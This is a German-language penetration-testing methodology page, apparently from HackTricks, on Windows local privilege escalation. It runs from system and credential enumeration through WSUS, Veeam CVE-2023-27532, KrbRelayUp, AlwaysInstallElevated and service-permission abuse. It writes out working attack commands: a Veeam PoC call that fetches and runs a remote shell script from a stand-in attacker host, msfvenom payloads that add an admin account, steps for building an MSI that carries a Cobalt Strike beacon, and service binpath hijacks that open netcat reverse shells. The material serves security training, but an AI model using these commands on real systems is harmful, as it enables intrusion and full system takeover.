# Lokale Rechteausweitung unter Windows

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Finden von Vektoren für die lokale Rechteausweitung unter Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Rechteausweitung unter Windows aus mehreren grundlegenden Anleitungen zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration basiert außerdem auf Community-Workshops und Checklisten.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Rechteausweitung unter Windows.<sup>[[5]](#references)</sup>

## Grundlegende Windows-Theorie

### Access Tokens

**Wenn du nicht weißt, was Windows-Access-Tokens sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integritätsstufen

**Wenn du nicht weißt, was Integritätsstufen unter Windows sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Unter Windows gibt es verschiedene Dinge, die dich daran hindern können, **das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und all diese **Abwehrmechanismen** **enumerieren**, bevor du mit der Enumeration zur Rechteausweitung beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / stille UIAccess-Elevation

Über `RAiLaunchAdminProcess` gestartete UIAccess-Prozesse können missbraucht werden, um ohne Eingabeaufforderungen eine hohe IL zu erreichen, wenn die Secure-Path-Prüfungen von AppInfo umgangen werden. Den entsprechenden Workflow zur Umgehung von UIAccess/Admin Protection findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Registry-Propagation für die Barrierefreiheit des Secure Desktop kann für einen beliebigen SYSTEM-Registry-Schreibzugriff (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds haben außerdem einen **SMB-LPE-Pfad über beliebige Ports** eingeführt, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration der Versionsinformationen

Prüfe, ob die Windows-Version bekannte Schwachstellen aufweist (überprüfe auch die installierten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Versions-Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas enthält watson)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Anmeldeinformationen oder andere Juicy-Informationen in den Umgebungsvariablen gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptionsdateien

Wie Sie dies aktivieren, erfahren Sie unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Um dies zu aktivieren, befolgen Sie die Anweisungen im Abschnitt „Transcript files“ der Dokumentation und wählen Sie **„Module Logging“** anstelle von **„Powershell Transcription“**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus PowerShell-Logs anzuzeigen, können Sie Folgendes ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Ein vollständiger Aktivitätsdatensatz sowie der gesamte Inhalt der Ausführung des Scripts werden erfasst. Dadurch wird sichergestellt, dass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Prozess bewahrt eine umfassende Prüfspur jeder Aktivität, die für die Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logging-Ereignisse für den Script Block findest du in der Windows-Ereignisanzeige unter dem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, kannst du Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Interneteinstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Du kannst das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Zunächst prüfst du, ob das Netzwerk ein nicht per SSL gesichertes WSUS-Update verwendet, indem du Folgendes in cmd ausführst:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder Folgendes in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn du eine Antwort wie eine der folgenden erhältst:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann **ist es exploitable.** Wenn der letzte Registry-Wert gleich 0 ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen zu exploiten, kannst du Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden – dies sind weaponized MiTM-Exploit-Scripts, um „fake“ Updates in nicht per SSL gesicherten WSUS-Traffic einzuschleusen.

Lies die Recherche hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lies den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Grunde ist dies der Fehler, den dieser Bug exploitet:

> Wenn wir die Möglichkeit haben, den Proxy unseres lokalen Users zu ändern, und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, haben wir somit die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als privilegierter User auf unserem Asset auszuführen.
>
> Da der WSUS-Service außerdem die Einstellungen des aktuellen Users verwendet, nutzt er auch dessen Certificate Store. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen generieren und dieses Zertifikat in den Certificate Store des aktuellen Users einfügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Traffic abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-First-Use-artige Validierung des Zertifikats zu implementieren. Wenn das präsentierte Zertifikat vom User vertrauenswürdig ist und den korrekten Hostnamen besitzt, wird es vom Service akzeptiert.

Du kannst diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) exploiten (sobald es veröffentlicht wurde).

## Third-Party Auto-Updater und Agent-IPC (local privesc)

Viele Enterprise-Agents stellen eine lokale IPC-Schnittstelle und einen privilegierten Update-Kanal bereit. Wenn die Enrollment auf einen Server des Angreifers umgeleitet werden kann und der Updater einer Rogue-Root-CA oder schwachen Signer-Prüfungen vertraut, kann ein lokaler User ein bösartiges MSI ausliefern, das der SYSTEM-Service installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Chain – CVE-2025-0309) findest du hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stellt einen lokalen Service auf **TCP/9401** bereit, der vom Angreifer kontrollierte Nachrichten verarbeitet und dadurch beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.<sup>[[12]](#references)</sup>

- **Recon**: Bestätige den Listener und die Version, z. B. mit `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: Platziere einen PoC wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam-DLLs im selben Verzeichnis und triggere anschließend ein SYSTEM-Payload über den lokalen Socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.
## KrbRelayUp

Eine **local privilege escalation**-Schwachstelle existiert in Windows-**domain**-Umgebungen unter bestimmten Bedingungen. Zu diesen Bedingungen gehören Umgebungen, in denen das **LDAP signing nicht erzwungen wird,** Benutzer über Self-Rights verfügen, die es ihnen ermöglichen, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und Benutzer Computer innerhalb der Domain erstellen können. Es ist wichtig zu beachten, dass diese **Voraussetzungen** mit den **default settings** erfüllt sind.

Finde den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs findest du unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungsschlüssel **aktiviert** sind (Wert ist **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
Wenn du eine Meterpreter-Sitzung hast, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` von Power-up, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Rechteerweiterung zu erstellen. Dieses Skript schreibt ein vorkompiliertes MSI-Installationsprogramm, das zur Hinzufügung eines Benutzers/einer Gruppe auffordert (du benötigst daher GIU-Zugriff):
```
Write-UserAddMSI
```
Führe einfach die erstellte Binary aus, um die Privilegien zu erweitern.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mithilfe dieser Tools einen MSI Wrapper erstellst. Beachte, dass du eine "**.bat**"-Datei wrappen kannst, wenn du **nur** **Befehlszeilen** **ausführen** möchtest.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Erstelle** mit Cobalt Strike oder Metasploit ein **neues Windows EXE TCP payload** unter `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und gib "installer" in das Suchfeld ein. Wähle das Projekt **Setup Wizard** aus und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende **`C:\privesc`** als Speicherort, wähle **place solution and project in the same directory** aus und klicke auf **Create**.
- Klicke weiter auf **Next**, bis du zu Schritt 3 von 4 gelangst (Dateien zum Einschließen auswählen). Klicke auf **Add** und wähle das soeben erstellte Beacon payload aus. Klicke anschließend auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** zu **x64**.
- Es gibt weitere Eigenschaften, die du ändern kannst, beispielsweise **Author** und **Manufacturer**, wodurch die installierte Anwendung legitimer wirken kann.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions**.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass das Beacon payload ausgeführt wird, sobald der Installer gestartet wird.
- Ändere unter den **Custom Action Properties** **Run64Bit** zu **True**.
- **Baue** es schließlich.
- Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI-Installation

Um die **Installation** der schädlichen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Audit-Einstellungen

Diese Einstellungen legen fest, was **protokolliert** wird, daher solltest du darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Logs gesendet werden.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** wurde für die **Verwaltung lokaler Administratorpasswörter** entwickelt und stellt sicher, dass jedes Passwort auf Computern, die einer Domäne beigetreten sind, **einzigartig, zufällig generiert und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden, sodass sie autorisiert sind, lokale Administratorpasswörter einzusehen.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiviert, werden **Passwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, deren **Speicher zu lesen** oder Code einzuschleusen, und das System dadurch weiter abzusichern.\
[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck besteht darin, auf einem Gerät gespeicherte Anmeldeinformationen vor Bedrohungen wie Pass-the-Hash-Angriffen zu schützen. [**Weitere Informationen zu Credential Guard sind hier verfügbar.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domänenanmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden normalerweise Domänenanmeldeinformationen für den Benutzer eingerichtet.\
[**Weitere Informationen zu Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen besitzt.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise deine Privilegien eskalieren**. Erfahre hier mehr über privilegierte Gruppen und wie du sie zur Privilegieneskalation missbrauchen kannst:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Auf der folgenden Seite erfährst du, wie du **interessante Tokens** identifizierst und wie du sie missbrauchen kannst:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Home-Verzeichnisse
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Kennwortrichtlinie
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Beim Auflisten der Prozesse solltest du zunächst **nach Passwörtern in der Befehlszeile des Prozesses suchen**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben** kannst oder ob du Schreibberechtigungen für den Ordner der Binärdatei besitzt, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Überprüfe immer, ob mögliche [**electron/cef/chromium debuggers** laufen; du könntest sie zur Privilege Escalation missbrauchen](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Überprüfen der Berechtigungen der Prozess-Binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfen der Berechtigungen der Ordner der Prozess-Binärdateien (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Mining von Passwörtern aus dem Speicher

Du kannst mit **procdump** aus sysinternals einen Memory Dump eines laufenden Prozesses erstellen. Dienste wie FTP haben die **Zugangsdaten im Klartext im Speicher**. Versuche, den Speicher zu dumpen und die Zugangsdaten auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows Help and Support“ (Windows + F1), nach „command prompt“ suchen, auf „Click to open Command Prompt“ klicken

## Dienste

Service Triggers ermöglichen es Windows, einen Dienst zu starten, wenn bestimmte Bedingungen eintreten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, das Anschließen eines Geräts, GPO-Aktualisierung usw.). Selbst ohne SERVICE_START-Rechte kann man privilegierte Dienste häufig durch das Auslösen ihrer Trigger starten. Siehe hier die Techniken zur Enumeration und Aktivierung:

-
{{#ref}}
service-triggers.md
{{#endref}}

Eine Liste der Dienste abrufen:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Du kannst **sc** verwenden, um Informationen über einen Dienst abzurufen
```bash
sc qc <service_name>
```
Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu überprüfen, ob „Authenticated Users“ einen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Hier kannst du accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privilege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil ihm keine aktivierten Geräte zugeordnet sind._

Du kannst ihn aktivieren mit
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Berücksichtige, dass der Dienst upnphost von SSDPSRV abhängt, damit er funktioniert (für XP SP1).**

**Eine weitere Behelfslösung** für dieses Problem besteht darin, Folgendes auszuführen:
```
sc.exe config usosvc start= auto
```
### **Pfad der Dienst-Binärdatei ändern**

Wenn die Gruppe „Authenticated users“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. Um **sc** zu ändern und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Berechtigungen können durch verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Service-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und dadurch das Ändern von Service-Konfigurationen.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Vererbt die Möglichkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Vererbt ebenfalls die Möglichkeit, Service-Konfigurationen zu ändern.

Für die Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Service-Binärdateien

Wenn ein Service als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder als privilegiertes Domain-Konto ausgeführt wird, aber **Benutzer mit niedrigen Berechtigungen die Service-EXE oder ihren übergeordneten Ordner ändern können**, kann der Service häufig durch **Ersetzen der Binärdatei und Neustarten des Service** übernommen werden.

**Prüfe, ob du die von einem Service ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner** hast, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst jede von einem Service ausgeführte Binärdatei mit **wmic** abrufen (nicht in system32) und deine Berechtigungen mit **icacls** überprüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Du kannst auch **sc** und **icacls** verwenden:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Suche nach gefährlichen ACLs, die **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`** gewährt wurden, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die Service-Executable oder das Verzeichnis, das sie enthält. Ein praktischer Abuse-Ablauf ist:<sup>[[27]](#references)</sup>

1. Bestätige das Service-Konto und den Pfad zur Executable mit `sc qc <service_name>`.
2. Bestätige mit `icacls <path>`, dass die Binary beschreibbar ist.
3. Ersetze die Service-Binary durch einen Payload oder eine gültige bösartige Service-Binary.
4. Starte den Service mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart / Service-Trigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Wenn der Dienst einem normalen Benutzer keinen Neustart erlaubt, prüfen Sie, ob er beim Booten automatisch gestartet wird, über eine Fehleraktion verfügt, die ihn erneut startet, oder indirekt durch die Anwendung ausgelöst werden kann, die ihn verwendet.

### Änderungsberechtigungen für die Dienstregistrierung

Sie sollten prüfen, ob Sie eine Dienstregistrierung ändern können.\
Sie können Ihre **Berechtigungen** für eine **Dienstregistrierung** wie folgt **prüfen**:
```bash
